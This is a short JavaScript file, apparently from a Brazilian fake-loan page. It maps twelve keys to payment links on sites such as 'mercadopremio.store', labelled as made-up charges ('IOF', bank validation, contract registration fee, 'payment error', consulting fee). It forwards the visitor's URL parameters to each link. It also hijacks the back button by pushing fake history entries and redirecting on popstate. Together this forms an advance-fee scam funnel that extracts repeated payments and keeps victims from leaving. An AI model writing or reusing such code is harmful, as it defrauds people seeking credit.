   const baseLinks = {
 up1: "https://pay.app-agil.online/PyE2Zy8MKb23qRb", // IOF
  up2: "https://pay.mercadopremio.store/65XDZB8L4JpgVJw", // Validação Bancaria
  up3: "https://pay.mercadopremio.store/n1NLgwJ7BMpGMxE", // Seguro Prestamista "tarifa de cadastro"
  up4: "https://pay.mercadopremio.store/N1nVZpYmNbLGlM6", // NFe
  up5: "https://pay.mercadopremio.store/kYL6geWm54oZrKM", // Ativar conta
  up6: "https://pay.mercadopremio.store/DPXw3XemwEOZzmp", // Taxa de registro do contrato
  up7: "https://pay.mercadopremio.store/eApQgz2jBMJgEb7", // ParabÃ©ns, 20k adicional
  up8: "https://pay.mercadopremio.store/DYp0ZxVEBMQgmvX", // Erro no pagamento - 14,06
  up9: "https://pay.mercadopremio.store/P5LNZ8zMRAOgaRy", // APP - 11,99
  up10: "https://pay.mercadopremio.store/nWrxGWALw7O3654", // Taxa de Abertura TAC - 16,92
  up11: "https://pay.mercadopremio.store/lDW0ZaJmeaRGN7E", // Taxa de Consultoria Financeira - 19,53
  up12: "https://google.com", // Taxa de Processamento Administrativo - 31,92
};

function redirect(key) {
  try {
    if (!baseLinks[key]) {
      throw new Error(`Link para ${key} não encontrado!`);
    }

    const url = new URL(baseLinks[key]);
    url.search = new URLSearchParams(window.location.search).toString();

    window.location.href = url.href;
  } catch (error) {
    console.error("Erro no redirecionamento:", error);
    alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
  }
}


const backRedirectBackLink = "/back";

// Adiciona duas entradas no histÃ³rico para capturar a navegaÃ§Ã£o para trÃ¡s
history.pushState({}, "", location.href);
history.pushState({}, "", location.href);

// Captura o evento de navegaÃ§Ã£o para trÃ¡s e redireciona
window.onpopstate = function () {
  setTimeout(() => {
    location.href = backRedirectBackLink;
  }, 1);
};